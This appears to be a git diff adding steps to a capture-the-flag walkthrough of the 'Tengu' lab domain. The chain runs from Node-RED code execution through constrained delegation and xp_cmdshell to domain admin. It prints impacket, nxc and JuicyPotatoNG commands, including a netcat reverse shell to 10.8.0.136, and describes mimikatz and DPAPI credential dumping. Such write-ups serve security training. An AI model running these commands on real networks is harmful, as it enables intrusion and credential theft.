@@ -36,7 +36,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ```
 
-##
+## nodered.tengu.vl
 
 ```bash
 PORT     STATE SERVICE       VERSION
@@ -50,6 +50,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Both windows hosts had only RDP service enabled, on linux hosts, there was something hosted on port 1880 which on googling shows it runs Node-RED, which is a flow based development tool for visual programming used in IoT devices
 
 <img src="https://i.imgur.com/DVKxUbk.png"/>
+
+## Remote Command Execution Through Node-RED
 
 Node-RED is known for getting remote command execution (RCE), to achieve this, we'll need to create a flow by timestamp block following exec block
 
@@ -70,6 +72,8 @@ After having the shell, it can be stabilized with python3 to use it as a normal 
 From `nodered` directory, we can find some type of hashed password but not really sure who this belongs to and how this can be cracked
 
 <img src="https://i.imgur.com/RgdICoH.png"/>
+
+## Accessing MSSQL
 
 From sql node properties, we can see the connection string with the username `nodered_connector`
 
@@ -123,15 +127,143 @@ proxychains bloodhound-python -d tengu.vl -u t2_m.winters -p 'Tengu123' -c all -
 
 <img src="https://i.imgur.com/EwzmEoc.png"/>
 
+## Escalating privileges on linux host
+
+From bloodhound, t2_m.winters is a member of linux admin group which means we can have local admin on the linux host
+
+<img src="https://i.imgur.com/vJy4Kgj.png"/>
+
+Through ssh we can easily switch to `t2_m.winters` user
+
+<img src="https://i.imgur.com/MvFRpCE.png"/>
+
+this host has `ReadGMSAPassword` on `GMSA01$` account
+
+<img src="https://i.imgur.com/cmO32Sb.png"/>
+
+## Constrained Delegation on SQL Host
+
+The NThash can be retrieved from `/etc/krb5.keytab`, this file contains service account hash in this case has NODERED's NThash, the hash can be extracted with KeyTabExtract https://github.com/sosdave/KeyTabExtract/tree/master
+
+<img src="https://i.imgur.com/mBoMFos.png"/>
+
+This hash can be verified by authenticating on DC
+
+<img src="https://i.imgur.com/5APWnDt.png"/>
+
+GMSA hash can be retrieved by using `--gmsa` module on LDAP
+
+```bash
+proxychains nxc ldap 10.10.238.213  -u 'NODERED$' -H 'hash' --gmsa
+```
+
+<img src="https://i.imgur.com/YpV4Nyt.png"/>
+
+This account has `AllowedToDelegate` permission on SQL host which means we can impersonate as a local admin on this host through MSSQL service, performing constrained delegation
+
+<img src="https://i.imgur.com/DVWhW1q.png"/>
+
+<img src="https://i.imgur.com/h6mwH98.png"/>
+
+With getST.py we can try to impersonate as administrator user for MSSQL service sql host but it didn't worked for administrator
+
+<img src="https://i.imgur.com/ctAd3zd.png"/>
+
+Instead of admin, we can check what other users we could target, there's a group name `SQL Admins` , with two users
+
+<img src="https://i.imgur.com/RFf5ajf.png"/>
+
+<img src="https://i.imgur.com/c0ECvWn.png"/>
+
+Here we can try to impersonate `T1.M_Winters` and then login through MSSQL using the ticket
+
+```bash
+proxychains impacket-getST -spn 'MSSQLSvc/sql.tengu.vl' -impersonate 'T1_M.WINTERS' -hashes :hash 'tengu.vl/gMSA01$'@sql.tengu.vl -dc-ip 10.10.168.213
+```
+
+<img src="https://i.imgur.com/SapDngi.png"/>
+
+From here xp_cmdshell can be enabled and system commands can be executed in the context of  `gmsa01$`
+
+<img src="https://i.imgur.com/ETRmBYU.png"/>
+
+With netcat, we can get a reverse shell
+
+<img src="https://i.imgur.com/GcMwq9K.png"/>
+
+Checking our privileges, we can get local administrator by abusing `SeImpersonatePrivilege` with JuicyPotato-NG or any other recent potato exploit
+
+<img src="https://i.imgur.com/idmTVMb.png"/>
+
+```bash
+JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:/Windows/Temp/nc.exe 10.8.0.136 3333 -e cmd.exe"
+```
+
+<img src="https://i.imgur.com/NCQKU09.png"/>
+
+<img src="https://i.imgur.com/TWQSBKe.png"/>
+
+## Lateral Movement - Extracting Credentials Trough DPAPI
+
+Running mimikatz to dump local admin hash and checking if there are any hashes in lsass
+
+<img src="https://i.imgur.com/LYGVWwE.png"/>
+
+ With `lsadump::cache` , domain cached credentials can be found where there's cached credentials for `c.fowler` but obviously this is not in NThash format so it cannot be used in pth unless it's gets cracked, which in this case was not the way
+
+<img src="https://i.imgur.com/EJbLRYt.png"/>
+
+To dump saved credentials from credential Manager/ task scheduler, we can target DPAPI which stores credentials with user specific keys, being a local admin we can utilize `sharpdpapi` to dump all credentials 
+
+```bash
+SharpDPAPI.exe machinecredentials
+```
+
+<img src="https://i.imgur.com/OX7iX2X.png"/>
+
+## Using kerberos authentication to spawn a shell as T0_c.fowler
+
+T0_c.fowler is a domain admin, authenticating against the DC to see if the password is valid
+
+<img src="https://i.imgur.com/R3PvJ1B.png"/>
+
+But the plain text password wasn't working and it's probably due to admin users belonging to Protected Users Group which is why we'll need to use kerberos authentication
+
+<img src="https://i.imgur.com/yS1lrHV.png"/>
+
+So instead, using `kinit` we can request TGT for the user by specifying the plain text password and we'll get our ticket using by modifying the  `/etc/krb5.conf` configuration file
+
+```bash
+[libdefaults]
+        default_realm = TENGU.VL
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        rdns = false
+        dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]
+        TENGU.VL = {
+                kdc = dc.tengu.vl
+        }
+
+[domain_realm]
+        .tengu.vl = TENGU.VL
+
+```
+
+<img src="https://i.imgur.com/fqceLwJ.png"/>
+
+Having the ticket, we can just dump hashes from ntds.dit using `secretsdump.py` or just spawn a shell using smb, wmi or psexec
+
+<img src="https://i.imgur.com/alNNOhz.png"/>
+
+<img src="https://i.imgur.com/hE0eisH.png"/>
 
 # References
 
 - https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
 - https://gist.github.com/Yeeb1/fe9adcd39306e3ced6bdfc7758a43519
-
-```
-nodered_connector:DreamPuppyOverall25
-t2_m.winters:af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147
-t2_m.winters:Tengu123
-
-```
+- https://github.com/sosdave/KeyTabExtract/tree/master
